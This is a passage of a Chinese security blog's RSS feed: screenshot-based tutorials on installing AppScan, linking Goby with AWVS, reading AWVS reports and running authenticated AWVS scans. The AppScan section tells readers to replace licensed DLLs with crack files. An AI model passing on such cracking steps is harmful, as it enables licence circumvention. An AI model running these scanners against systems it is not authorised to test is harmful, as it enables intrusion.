-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101727775.png&#34; alt=&#34;image-20211220101727775&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;6在火狐浏览器复制cookie&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6在火狐浏览器复制cookie&#34;&gt;#&lt;/a&gt; 6. 在火狐浏览器复制 cookie&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101740026.png&#34; alt=&#34;image-20211220101740026&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;7切换到appscan点击添加cookie点击确定&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7切换到appscan点击添加cookie点击确定&#34;&gt;#&lt;/a&gt; 7. 切换到 AppScan，点击【+】，添加 cookie，点击【确定】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101752959.png&#34; alt=&#34;image-20211220101752959&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;8点击确定&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8点击确定&#34;&gt;#&lt;/a&gt; 8. 点击确定&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101803601.png&#34; alt=&#34;image-20211220101803601&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;9点击手动探索选则appscan-chromium-浏览器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#9点击手动探索选则appscan-chromium-浏览器&#34;&gt;#&lt;/a&gt; 9. 点击【手动探索】，选则【AppScan Chromium 浏览器】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101815512.png&#34; alt=&#34;image-20211220101815512&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;10进行手工探索完成后点击确定&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#10进行手工探索完成后点击确定&#34;&gt;#&lt;/a&gt; 10. 进行手工探索，完成后，点击【确定】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101829329.png&#34; alt=&#34;image-20211220101829329&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101836928.png&#34; alt=&#34;image-20211220101836928&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;11点击确定&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11点击确定&#34;&gt;#&lt;/a&gt; 11. 点击【确定】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101848039.png&#34; alt=&#34;image-20211220101848039&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101854695.png&#34; alt=&#34;image-20211220101854695&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;12点击扫描-仅测试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#12点击扫描-仅测试&#34;&gt;#&lt;/a&gt; 12. 点击【扫描】--【仅测试】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101906463.png&#34; alt=&#34;image-20211220101906463&#34;&gt;&lt;/p&gt;
-&lt;p&gt;13. 点击【是】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101916451.png&#34; alt=&#34;image-20211220101916451&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;14选择保存位置点击保存&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#14选择保存位置点击保存&#34;&gt;#&lt;/a&gt; 14. 选择保存位置，点击【保存】&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101929768.png&#34; alt=&#34;image-20211220101929768&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;15等待扫描结果&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#15等待扫描结果&#34;&gt;#&lt;/a&gt; 15. 等待扫描结果&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101941766.png&#34; alt=&#34;image-20211220101941766&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211220101948472.png&#34; alt=&#34;image-20211220101948472&#34;&gt;&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://mangpumo.github.io/2023/01/11/AppScan%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%AE%89%E8%A3%85/</guid>
-            <title>AppScan介绍和安装</title>
-            <link>https://mangpumo.github.io/2023/01/11/AppScan%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%AE%89%E8%A3%85/</link>
-            <pubDate>Wed, 11 Jan 2023 05:32:05 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;第一节-appscan介绍和安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一节-appscan介绍和安装&#34;&gt;#&lt;/a&gt; 第一节 - AppScan 介绍和安装&lt;/h1&gt;
-&lt;h2 id=&#34;1简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1简介&#34;&gt;#&lt;/a&gt; 1. 简介&lt;/h2&gt;
-&lt;p&gt;Appscan 10 中文版是是全新网络安全漏洞扫描软件，软件可以直接可以对 OS 命令、SSRF 和 XXE 攻击等漏洞进行检测，使得漏洞检测更加容易，提高漏洞的扫描效率。软件同时支持动态、静态、互动分析三种不同的测试功能，可自动化扫描检测网络或者系统安全漏洞，并采用全新的爬虫技术，能够根据网站入口自动摸取网页链接进行安全扫描，提供了扫描、报告和修复建议等功能。&lt;/p&gt;
-&lt;h2 id=&#34;2功能特色&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2功能特色&#34;&gt;#&lt;/a&gt; 2. 功能特色&lt;/h2&gt;
-&lt;p&gt;1、动态分析（“黑盒扫描”）&lt;/p&gt;
-&lt;p&gt;这是主要方法，用于测试和评估运行时的应用程序响应。&lt;/p&gt;
-&lt;p&gt;2、静态分析（“白盒扫描”）【代码审计】&lt;/p&gt;
-&lt;p&gt;这是用于在完整 Web 页面上下文中分析 JavaScript 代码的独特技术。&lt;/p&gt;
-&lt;p&gt;3、交互分析（“glass box 扫描”）&lt;/p&gt;
-&lt;p&gt;动态测试引擎可与驻留在 Web 服务器本身上的专用 glass-box 代理程序交互，从而使软件能够比仅通过传统动态测试时识别更多问题并具有更高准确性。&lt;/p&gt;
-&lt;p&gt;4、软件的高级功能包括：&lt;/p&gt;
-&lt;p&gt;常规和法规一致性报告，并提供超过 40 个不同的开箱即用模板。&lt;/p&gt;
-&lt;h2 id=&#34;3扫描流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3扫描流程&#34;&gt;#&lt;/a&gt; 3. 扫描流程&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211201203930801.png&#34; alt=&#34;image-20211201203930801&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211201203950394.png&#34; alt=&#34;image-20211201203950394&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;4扫描方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4扫描方式&#34;&gt;#&lt;/a&gt; 4. 扫描方式&lt;/h2&gt;
-&lt;p&gt;Static： 静态分析 （白盒扫描）   源码分析：支持（Taint analysis\pattern matching）&lt;/p&gt;
-&lt;p&gt;Dynamic： 动态分析 （黑盒扫描）&lt;/p&gt;
-&lt;p&gt;Hybrid：混合分析（黑，白）【知道源代码】&lt;/p&gt;
-&lt;p&gt;Run-Time： 运行时分析（玻璃盒）【不知道源代码】&lt;/p&gt;
-&lt;p&gt;Client-Side：客户端分析 (Javascript)&lt;/p&gt;
-&lt;h2 id=&#34;5安装与破解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5安装与破解&#34;&gt;#&lt;/a&gt; 5. 安装与破解&lt;/h2&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEueG4tLWxkcng4dGJhMjM0N2JjYTA3OXMuTkVU&#34;&gt;1. 安装前需安装.NET&lt;/span&gt; Framework 4.7.2（已安装请忽略）&lt;/p&gt;
-&lt;p&gt;2. 双击运行 Appscan_Setup_1002.exe，选择安装语言，点击确定；&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211201204315728.png&#34; alt=&#34;image-20211201204315728&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 选择 I accept，点击下一步；&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211201204336720.png&#34; alt=&#34;image-20211201204336720&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 更改安装目录，点击安装；（注意记录下这个目录后面破解需要用到）&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211201204403352.png&#34; alt=&#34;image-20211201204403352&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 等待安装直到完成；&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211201204422500.png&#34; alt=&#34;image-20211201204422500&#34;&gt;&lt;/p&gt;
-&lt;p&gt;6. 将破解文件 AppScanSDK.dll 和 HclLicenseProvider.dll 拷贝到安装目录 D:\Program Files (x86)\HCL\AppScan Standard 下替换原来的文件&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211201204444993.png&#34; alt=&#34;image-20211201204444993&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211201204453175.png&#34; alt=&#34;image-20211201204453175&#34;&gt;&lt;/p&gt;
-&lt;p&gt;7. 双击桌面图标运行 AppScan；&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211201204517852.png&#34; alt=&#34;image-20211201204517852&#34;&gt;&lt;/p&gt;
-&lt;p&gt;8. 安装成功&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211201204548270.png&#34; alt=&#34;image-20211201204548270&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/image-20211201204557166.png&#34; alt=&#34;image-20211201204557166&#34;&gt;&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://mangpumo.github.io/2023/01/11/Goby%E5%92%8CAWVS%E8%81%94%E5%8A%A8/</guid>
-            <title>Goby和AWVS联动</title>
-            <link>https://mangpumo.github.io/2023/01/11/Goby%E5%92%8CAWVS%E8%81%94%E5%8A%A8/</link>
-            <pubDate>Wed, 11 Jan 2023 05:31:00 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;第五节-gobyawvs-联动&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第五节-gobyawvs-联动&#34;&gt;#&lt;/a&gt; 第五节 - Goby+AWVS 联动&lt;/h1&gt;
-&lt;h2 id=&#34;1goby简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1goby简介&#34;&gt;#&lt;/a&gt; 1.Goby 简介&lt;/h2&gt;
-&lt;p&gt;Goby 是针对目标企业梳理最全面的工具，同构 goby 可以清晰的扫描出 ip 地址开放的端口，以及端口对应的服务，于此同事会根据开放的端口及应用进行实战化的测试，并不在乎他的中低危害漏洞，而更在乎的是它能直接 getshell 的漏洞。&lt;/p&gt;
-&lt;p&gt;AWVS 这款工具大家应该都比较熟悉了，他是针对 web 的轻量级的漏洞扫描工具。也就是根据我们提供的被扫描地址，快速的扫描出其所有的漏洞，包含高中低及信息泄露等漏洞。&lt;/p&gt;
-&lt;p&gt;结合我们前面的介绍，大家想想，Goby 探测出 ip 地址开放的所有服务及应用，然后直接丢给 AWVS，那么 AWVS 是不是就可以直接进行扫描了，然后存在的网站存在的漏扫是不是一幕了然了，还需要我们去手动挖么，很显然了啊，这俩工具一联动，躺着收洞洞呗。&lt;/p&gt;
-&lt;p&gt;Goby 错误异常汇总&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbi5nb2JpZXMub3JnL2ZhcS5odG1s&#34;&gt;https://cn.gobies.org/faq.html&lt;/span&gt;&lt;/p&gt;
-&lt;h2 id=&#34;2goby安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2goby安装&#34;&gt;#&lt;/a&gt; 2.Goby 安装&lt;/h2&gt;
-&lt;p&gt;1. 在附件中下载 goby-win-x64-1.9.320.zip&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/cae347217f2e4edb8f49885f9c31a6f2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2. 解压到喜欢的位置&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/b25b706b644b4b54a1c5444d7773c6ff.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 解压目录找到 Goby.exe 右键 -- 管理员运行&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/7c563477fdff4c5a92a428fa38faba5f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 点击【是】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/1c17dae4b2724ad9a4609c8209c568b0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 点击【More】如图所示，点击【EN】，点击【CN】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/d1622b88bc2e43fd94bd7d394c2e6ba9.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;6. 点击【扩展程序】，搜索【AWVS】，点击【下载】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/94e1952d4b714acd8b24bdc3b4c50976.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;7. 点击【已下载】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/39fed8e90aeb463b8e99cbb721c626b0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;8. 点击【设置】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/6faa54cf76814488b5cc2e8c83b41efb.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;9. 切换到【AWVS】，点击【用户】，点击【Profile】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/fa740fd2d32c46b5ad8cdd850deefa46.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;10. 找到【API Key】，点击【Generate New Api Key】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/23a868079ed34c498768f5d1bfa4a755.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;11. 点击【Show】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/3873ed2d97d04a4a8e8b8f85150c9e5d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;12. 点击【copy】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/f8ea9c32faf2473b90555bca447f6a83.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;13. 切换【Goby】，粘贴【API Key】和输入【AVWS WEB ADDress】，点击【Confirm】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/8545ca84026847929bd53a6285f97edf.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;14. 点击【设置】，点击【扩展设置】，点击【确认】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/701dd8ccce124f31979a9b6600a5e74a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;3安装npcap-09995exe&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3安装npcap-09995exe&#34;&gt;#&lt;/a&gt; 3. 安装 npcap-0.9995.exe&lt;/h2&gt;
-&lt;p&gt;1. 右键点击附件里的【npcap-0.9995.exe】，选则【以管理员身份运行】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/f96ab014dfcd46d4a650b11b35f8f336.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2. 点击【是】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/d41404e228f64985a88963772328a880.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 点击【I Agree】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/3f7a7549f8cf4dab8d7bdd02685d2388.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 点击【Install】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/27389ce180dc455c9664b7ba65497d98.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 点击【确定】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/36733835588743a9a6f48f1c8995d86f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;6. 点击【Next】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/fa9e44c0f7ea43f580eaa960ffd22238.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;7. 点击【Finish】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/7fd9171e27a24a3db7b5f7ae0dd12f1b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;4gobyawvs联动扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4gobyawvs联动扫描&#34;&gt;#&lt;/a&gt; 4.Goby+AWVS 联动扫描&lt;/h2&gt;
-&lt;p&gt;1. 点击【扫描】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/e745ef82f410486a8c29fb843f2461df.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2. 输入 ip 进行扫描，点击【开始】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/3fbba4b002b34c17b9cef3f28df2199c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 等待扫描结果&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/d82b2aa35ea04f55bd3657510b9b4ee9.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/a1555b1037414aa89d64974f5de7aa2d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 点击【Web 检测】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/0d6585029108492b92257c9fa108cba2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 点击【awvs】扫描&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/cf99391ca82e4b0db9569ca2ff4e6585.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;6. 切换到【AWVS】，点击【Scans】，点击【Goby 传过来的任务】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/8ce4d62b7ce141fdbf18e01a3150afe2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/1f1055af4d6848338edfd6a5dd4b7de1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;7. 切回到【Goby】，点击【扩展程序】, 点击【awvs】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/f3d160eed543449cafc8a417c8d6f85d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;8. 选择报告模板，点击【Generate】, 生成报告&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/05d00d10c2bc4de8b8d857f993d32588.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;9. 点击【Export】可以导出报告&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/a93fcf070fa84692ae562e68e156cdb4.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://mangpumo.github.io/2023/01/11/AWVS%E6%89%AB%E6%8F%8F%E6%8A%A5%E5%91%8A%E5%88%86%E6%9E%90/</guid>
-            <title>AWVS扫描报告分析</title>
-            <link>https://mangpumo.github.io/2023/01/11/AWVS%E6%89%AB%E6%8F%8F%E6%8A%A5%E5%91%8A%E5%88%86%E6%9E%90/</link>
-            <pubDate>Wed, 11 Jan 2023 05:30:12 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;第四节-扫描报告分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第四节-扫描报告分析&#34;&gt;#&lt;/a&gt; 第四节 - 扫描报告分析&lt;/h1&gt;
-&lt;h2 id=&#34;awvs报告类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#awvs报告类型&#34;&gt;#&lt;/a&gt; AWVS 报告类型&lt;/h2&gt;
-&lt;p&gt;Standard Reports：标准报告&lt;/p&gt;
-&lt;p&gt;Affected Items：受影响项目&lt;/p&gt;
-&lt;p&gt;Comprehensive (new)：综合（新）&lt;/p&gt;
-&lt;p&gt;Developer：开发者&lt;/p&gt;
-&lt;p&gt;Executive Summary：执行摘要&lt;/p&gt;
-&lt;p&gt;Quick：快速报告&lt;/p&gt;
-&lt;h2 id=&#34;compliance-reports合规报告&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#compliance-reports合规报告&#34;&gt;#&lt;/a&gt; Compliance Reports：合规报告&lt;/h2&gt;
-&lt;p&gt;CWE / SANS Top 25：SANS (SysAdmin, Audit, Network, Security) 研究所是美国一家信息安全培训与认证机构&lt;/p&gt;
-&lt;p&gt;DISA STIG：DISA STIG 是指提供技术指南（STIG — 安全技术实施指南）的组织（DISA — 国防信息系统局）&lt;/p&gt;
-&lt;p&gt;HIPAA：HIPAA 标准&lt;/p&gt;
-&lt;p&gt;ISO 27001：国际标准&lt;/p&gt;
-&lt;p&gt;NIST SP 800-53：联邦信息系统标准&lt;/p&gt;
-&lt;p&gt;OWASP Top 10 2013：开放式 Web 应用程序安全项目 2013 标准&lt;/p&gt;
-&lt;p&gt;OWASP Top 10 2017：开放式 Web 应用程序安全项目 2017 标准&lt;/p&gt;
-&lt;p&gt;PCI DSS 3.2：即支付卡行业数据安全标准&lt;/p&gt;
-&lt;p&gt;Sarbanes Oxley：萨班斯法案标准&lt;/p&gt;
-&lt;p&gt;WASC Threat Classification：WASC 组织标准&lt;/p&gt;
-&lt;h2 id=&#34;最常用的报告类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#最常用的报告类型&#34;&gt;#&lt;/a&gt; 最常用的报告类型：&lt;/h2&gt;
-&lt;p&gt;1.Executive Summary：执行摘要 给公司大领导看，只关注整体情况，不关注具体细节&lt;/p&gt;
-&lt;p&gt;2.Comprehensive (new)：综合（新）：一般给 QA 和产品经理看&lt;/p&gt;
-&lt;p&gt;3.Developer：开发者：给开发人员看&lt;/p&gt;
-&lt;p&gt;4.OWASP Top 10 2017 行业报告的代表&lt;/p&gt;
-&lt;p&gt;5.WASC Threat Classification 行业报告的代表&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://mangpumo.github.io/2023/01/11/AWVS%E6%89%AB%E6%8F%8FWeb%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/</guid>
-            <title>AWVS扫描Web应用程序</title>
-            <link>https://mangpumo.github.io/2023/01/11/AWVS%E6%89%AB%E6%8F%8FWeb%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/</link>
-            <pubDate>Wed, 11 Jan 2023 05:29:37 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;第三节-awvs扫描web应用程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第三节-awvs扫描web应用程序&#34;&gt;#&lt;/a&gt; 第三节 - AWVS 扫描 Web 应用程序&lt;/h1&gt;
-&lt;h2 id=&#34;1账户密码登录扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1账户密码登录扫描&#34;&gt;#&lt;/a&gt; 1. 账户密码登录扫描&lt;/h2&gt;
-&lt;p&gt;1. 点击【Targets】，点击【add Target】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/36991ed7d4ba43f5aff2ed560749d35c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2. 输入扫描地址和扫描描述，点击【save】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/a92e61f1c3cf479ca7c04a8105bc617b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 点击【Site Login】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/cc6082a28000438fb243888a3b5327f5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 选择【try to auto-login into the site】, 输入登录地址，用户名【xiaogang】，密码【123456】，重复密码【123456】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/4f5f3ed8e050454da04304dfbf077784.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 点击【HTTP Authentication】的开启按钮&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/ca1b8fd89df143d8a32a114a9f971fa6.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;6. 输入用户名【小刚】, 密码【123456】，重复密码【123456】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/02d9c182fc4a4aaf84186c293614aac5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;7. 点击【save】，然后点击【Scan】按钮&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/d9df48791deb4782bf8e421cc69d64a8.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;8. 选择扫描设置，如图所示，点击【create Scan】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/4ebab4587a3a4abf81832bc4989c26ba.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;9. 点击扫描目标，查看扫描具体内容&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/9e11ed8ed6f24a76a46002b080400de5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/5e96d1f03e154a0f822790fa2c0e68ec.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;10. 等待扫描完成&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/d78be9706759447580549e5988e03992.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/4d217c7e40e74a27b0ef45cc199e8164.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/c0a379d78ce840c8a7e53eb742c00063.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;2利用录制登录序列脚本扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2利用录制登录序列脚本扫描&#34;&gt;#&lt;/a&gt; 2. 利用录制登录序列脚本扫描&lt;/h2&gt;
-&lt;p&gt;1. 点击【Targets】，点击【add Target】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/339ff784fc8a4afb9ff6764f19515ef6.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2. 输入扫描地址和扫描描述，点击【save】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/776d1d5413c344f9b0971f516d601343.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 点击【Site Login】&lt;/p&gt;
